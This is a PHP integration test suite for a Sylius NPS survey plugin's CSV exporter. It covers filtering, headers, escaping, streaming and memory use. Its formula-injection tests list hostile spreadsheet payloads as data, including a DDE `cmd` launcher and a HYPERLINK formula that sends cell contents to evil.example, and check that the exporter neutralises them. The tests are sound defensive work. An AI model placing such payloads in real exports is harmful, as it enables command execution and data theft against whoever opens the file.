<?php

declare(strict_types=1);

namespace Tests\Cyfrowe\SyliusNpsPlugin\Integration\Export;

use Cyfrowe\SyliusNpsPlugin\Entity\HandlingStatus;
use Cyfrowe\SyliusNpsPlugin\Entity\Survey;
use Cyfrowe\SyliusNpsPlugin\Export\SurveyCsvExporter;
use Cyfrowe\SyliusNpsPlugin\Grid\FilteredSurveys;
use Psr\Clock\ClockInterface;
use Sylius\Component\Grid\Parameters;
use Symfony\Contracts\Translation\TranslatorInterface;
use Tests\Cyfrowe\SyliusNpsPlugin\Integration\IntegrationTestCase;
use Tests\Cyfrowe\SyliusNpsPlugin\Integration\SurveyFactory;

final class SurveyCsvExporterTest extends IntegrationTestCase
{
    // Ends in a backslash on purpose: that is the value PHP's default CSV escape character
    // mangles, shifting every later column by one.
    private const AWKWARD_COMMENT = "Dear \"support\",\nthe lens arrived scratched; the box, too. \\";

    private SurveyFactory $factory;

    protected function setUp(): void
    {
        parent::setUp();

        $this->factory = new SurveyFactory($this->entityManager);
    }

    public function testTheFileHoldsOnlyTheRecordsTheListIsShowing(): void
    {
        $this->answer('ORD-WANTED', 9)->setChannelCode('WANTED');
        $this->answer('ORD-ELSEWHERE', 9)->setChannelCode('OTHER');
        $this->entityManager->flush();

        $rows = $this->rowsOf($this->exporter(), ['channelCode' => 'WANTED']);

        self::assertCount(1, $rows, 'September on screen must not mean everything in the file.');
        self::assertSame('ORD-WANTED', $rows[0][4]);
    }

    public function testTheHeaderRowComesFromTheTranslations(): void
    {
        $header = $this->headerOf($this->exporter());

        self::assertCount(13, $header);
        self::assertSame($this->translator()->trans('cyfrowe_nps.ui.scored_at'), $header[0]);
        self::assertSame($this->translator()->trans('cyfrowe_nps.ui.currency'), $header[6]);
        self::assertSame($this->translator()->trans('cyfrowe_nps.ui.handling_status'), $header[11]);
        self::assertSame($this->translator()->trans('cyfrowe_nps.ui.survey_status'), $header[12]);
    }

    public function testTheOrderValueAndItsCurrencyAreColumnsOfTheirOwn(): void
    {
        $survey = $this->answer('ORD-PAID', 9);
        $survey->setOrderTotal(12999);
        $survey->setCurrencyCode('EUR');
        $this->entityManager->flush();

        $row = $this->rowsOf($this->exporter())[0];

        self::assertSame('129.99', $row[5]);
        self::assertSame('EUR', $row[6], 'A number without its currency is a number nobody can add up.');
    }

    public function testACommentWithASeparatorAQuoteAndALineBreakKeepsTheFileIntact(): void
    {
        $survey = $this->answer('ORD-CROSS', 2);
        $survey->setComment(self::AWKWARD_COMMENT);
        $survey->setHandlingStatus(HandlingStatus::Done);
        $this->entityManager->flush();

        $rows = $this->rowsOf($this->exporter());

        self::assertCount(1, $rows, 'The comment must not break the record into several.');
        self::assertCount(13, $rows[0]);
        self::assertSame(self::AWKWARD_COMMENT, $rows[0][9]);
        self::assertSame($this->translator()->trans('cyfrowe_nps.ui.handling_statuses.done'), $rows[0][11]);
    }

    /**
     * @dataProvider formulaTriggers
     *
     * @param non-empty-string $comment
     */
    public function testACommentIsNeverHandedToTheSpreadsheetAsAFormula(string $comment): void
    {
        $survey = $this->answer('ORD-FORMULA', 2);
        $survey->setComment($comment);
        $this->entityManager->flush();

        $cell = $this->rowsOf($this->exporter())[0][9];

        self::assertStringEndsWith($comment, $cell, 'The comment itself has to survive.');
        self::assertStringStartsNotWith($comment[0], $cell, sprintf(
            'A cell opening with "%s" is a formula to Excel and to Google Sheets, and the author of it is the customer.',
            $comment[0],
        ));
    }

    /**
     * @dataProvider textColumns
     */
    public function testEveryTextColumnIsHandedToTheSpreadsheetAsText(string $field, int $column): void
    {
        $formula = '=HYPERLINK("http://evil.example/?x="&A1,"Invoice")';

        $survey = $this->answer('ORD-COLUMNS', 2);
        $this->write($survey, $field, $formula);
        $this->entityManager->flush();

        $cell = $this->rowsOf($this->exporter())[0][$column];

        self::assertStringEndsWith($formula, $cell, sprintf('The value of "%s" itself has to survive.', $field));
        self::assertStringStartsNotWith('=', $cell, sprintf(
            'Column %d carries "%s", which a shop or a customer writes, so it needs the same guard as the comment.',
            $column,
            $field,
        ));
    }

    /**
     * @return iterable<string, array{string, int}>
     */
    public static function textColumns(): iterable
    {
        yield 'email' => ['email', 3];
        yield 'order number' => ['orderNumber', 4];
        yield 'shipping method' => ['shippingMethodName', 7];
        yield 'channel' => ['channelCode', 8];
        yield 'comment' => ['comment', 9];
    }

    private function write(Survey $survey, string $field, string $value): void
    {
        match ($field) {
            'email' => $survey->getCustomer()?->setEmail($value),
            'orderNumber' => $survey->setOrderNumber($value),
            'shippingMethodName' => $survey->setShippingMethodName($value),
            'channelCode' => $survey->setChannelCode($value),
            'comment' => $survey->setComment($value),
            default => self::fail(sprintf('No column of the file is written from "%s".', $field)),
        };
    }

    /**
     * @return iterable<string, array{non-empty-string}>
     */
    public static function formulaTriggers(): iterable
    {
        yield 'equals' => ['=1+1'];
        yield 'plus' => ['+1+1'];
        yield 'minus' => ['-1+1'];
        yield 'at' => ['@SUM(1+1)'];
        yield 'tab' => ["\t=1+1"];
        yield 'carriage return' => ["\r=1+1"];
        yield 'command' => ["=cmd|'/c calc'!A1"];
        yield 'hyperlink' => ['=HYPERLINK("http://evil.example/?x="&A1,"Invoice")'];
    }

    public function testTheDecimalSeparatorOfTheOrderValueIsASettingOfItsOwn(): void
    {
        $survey = $this->answer('ORD-PAID', 9);
        $survey->setOrderTotal(12999);
        $this->entityManager->flush();

        // A full stop lands in Excel as text on a locale that writes decimals with a comma, which
        // is the same problem as the column separator and belongs in the same place.
        $exporter = $this->exporter(delimiter: ';', decimalSeparator: ',');

        self::assertSame('129,99', $this->rowsOf($exporter, [], ';')[0][5]);
    }

    public function testAFileLongerThanOneFlushComesOutWhole(): void
    {
        // Past the point where the exporter hands what it has to the client, so the boundary
        // itself is covered rather than assumed.
        $this->insertAnswers(1200);

        $rows = $this->rowsOf($this->exporter());

        self::assertCount(1200, $rows);
        self::assertSame('ORD-01199', $rows[1199][4], 'The last record must survive the last flush.');
    }

    public function testTheRecordsLeaveTheProcessAsTheyAreWritten(): void
    {
        $this->insertAnswers(1200);

        $chunks = 0;

        ob_start(static function (string $chunk) use (&$chunks): string {
            ++$chunks;

            return '';
        });

        $this->exporter()->export(new Parameters())->sendContent();
        ob_end_flush();

        // Reading the records in batches is only half of the guarantee. Written under an output
        // buffer and never flushed, the whole file would still pile up in memory before any of it
        // left the process - so more than the one closing chunk has to come out.
        self::assertGreaterThan(1, $chunks);
    }

    private function insertAnswers(int $records): void
    {
        $values = [];

        for ($i = 0; $i < $records; ++$i) {
            $values[] = sprintf("('scored', 'ORD-%05d', 9, '2026-09-02 10:00:00', 0, 'new')", $i);
        }

        $this->entityManager->getConnection()->executeStatement(
            'INSERT INTO cyfrowe_nps_survey (status, order_number, score, score_set_at, bot_suspected, handling_status) VALUES ' .
            implode(',', $values),
        );
    }

    public function testTheFileFollowsRfc4180OutOfTheBox(): void
    {
        $this->answer('ORD-PLAIN', 9);
        $this->entityManager->flush();

        $csv = $this->csvOf($this->exporter());

        self::assertStringStartsNotWith("\xEF\xBB\xBF", $csv, 'A byte order mark is not part of RFC 4180.');
        self::assertStringContainsString("\r\n", $csv, 'Records are separated by CRLF.');
        self::assertStringContainsString('ORD-PLAIN', $csv);
        self::assertStringNotContainsString(';', $csv);
    }

    public function testItCanBeSetUpForExcelOnALocaleThatWantsSemicolons(): void
    {
        $survey = $this->answer('ORD-EXCEL', 9);
        $survey->setComment('Bardzo dobrze, polecam');
        $this->entityManager->flush();

        $exporter = $this->exporter(delimiter: ';', bom: true);
        $csv = $this->csvOf($exporter);

        self::assertStringStartsWith("\xEF\xBB\xBF", $csv);
        self::assertSame(
            'Bardzo dobrze, polecam',
            $this->rowsOf($exporter, [], ';')[0][9],
            'A comma inside a value is no longer special.',
        );
        self::assertStringContainsString(';', $csv);
    }

    public function testNoRecordIsHydratedToBuildTheFile(): void
    {
        for ($i = 0; $i < 30; ++$i) {
            $this->answer(sprintf('ORD-%05d', $i), $i % 11);
        }
        $this->entityManager->flush();
        $this->entityManager->clear();

        self::assertCount(30, $this->rowsOf($this->exporter()));

        // Counting the whole identity map would not do: resolving the panel language pulls in the
        // channel, its locale and its currency once, whatever the size of the file. What has to
        // stay empty is the records themselves.
        $identityMap = $this->entityManager->getUnitOfWork()->getIdentityMap();

        self::assertCount(
            0,
            $identityMap[Survey::class] ?? [],
            'The file is written from plain values; hydrating records is what makes a big export run out of memory.',
        );
    }

    private function exporter(string $delimiter = ',', string $enclosure = '"', bool $bom = false, string $decimalSeparator = '.'): SurveyCsvExporter
    {
        $filteredSurveys = self::getContainer()->get('cyfrowe_nps.grid.filtered_surveys');
        assert($filteredSurveys instanceof FilteredSurveys);

        $clock = self::getContainer()->get('clock');
        assert($clock instanceof ClockInterface);

        return new SurveyCsvExporter($filteredSurveys, $this->translator(), $clock, $delimiter, $enclosure, $decimalSeparator, $bom);
    }

    private function translator(): TranslatorInterface
    {
        $translator = self::getContainer()->get('translator');
        assert($translator instanceof TranslatorInterface);

        return $translator;
    }

    /**
     * @param array<string, mixed> $criteria
     */
    private function csvOf(SurveyCsvExporter $exporter, array $criteria = []): string
    {
        $response = $exporter->export(new Parameters(['criteria' => $criteria]));

        // Collected through a callback rather than with a plain ob_start: the exporter hands each
        // batch of records to the client as it goes, and a flush moves content out of the buffer
        // it was written to. A plain capture would keep only whatever came after the last one.
        $captured = '';

        ob_start(static function (string $chunk) use (&$captured): string {
            $captured .= $chunk;

            return '';
        });

        $response->sendContent();
        ob_end_flush();

        return $captured;
    }

    /**
     * Parsed back through a real reader rather than by splitting on newlines, because a comment is
     * allowed to contain one.
     *
     * @param array<string, mixed> $criteria
     *
     * @return list<list<string>>
     */
    private function parse(SurveyCsvExporter $exporter, array $criteria, string $delimiter, string $escape): array
    {
        $path = tempnam(sys_get_temp_dir(), 'nps-export');
        assert(is_string($path));
        file_put_contents($path, $this->csvOf($exporter, $criteria));

        $handle = fopen($path, 'rb');
        assert(false !== $handle);

        $records = [];

        while (false !== ($record = fgetcsv($handle, 0, $delimiter, '"', $escape))) {
            /** @var list<string> $record */
            $records[] = $record;
        }

        fclose($handle);
        unlink($path);

        return $records;
    }

    /**
     * @param array<string, mixed> $criteria
     *
     * @return list<list<string>>
     */
    private function rowsOf(SurveyCsvExporter $exporter, array $criteria = [], string $delimiter = ',', string $escape = ''): array
    {
        $records = $this->parse($exporter, $criteria, $delimiter, $escape);
        array_shift($records);

        return $records;
    }

    /**
     * @return list<string>
     */
    private function headerOf(SurveyCsvExporter $exporter): array
    {
        return $this->parse($exporter, [], ',', '')[0];
    }

    private function answer(string $orderNumber, int $score): Survey
    {
        $survey = $this->factory->createSurvey();
        $survey->setOrderNumber($orderNumber);
        $survey->setScore($score);
        $survey->setScoreSetAt(new \DateTimeImmutable('2026-09-02 10:00:00'));

        return $survey;
    }
}
